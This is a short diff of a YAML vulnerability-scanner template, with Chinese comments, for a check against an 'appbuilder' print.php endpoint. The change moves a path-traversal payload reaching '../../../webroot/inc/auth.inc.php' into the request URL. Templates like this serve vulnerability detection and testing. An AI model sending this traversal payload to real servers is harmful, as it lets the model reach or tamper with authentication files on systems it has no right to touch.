@@ -8,11 +8,11 @@
 
 #漏洞的位置
 - url:
-  - url : "/module/appbuilder/assets/print.php"
+  - url : "/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
 
 #payload
 - payload:
-  - payload: 'guid=../../../webroot/inc/auth.inc.php'
+  - payload: 'isNone'
 
 #response包里状态码
 - status:
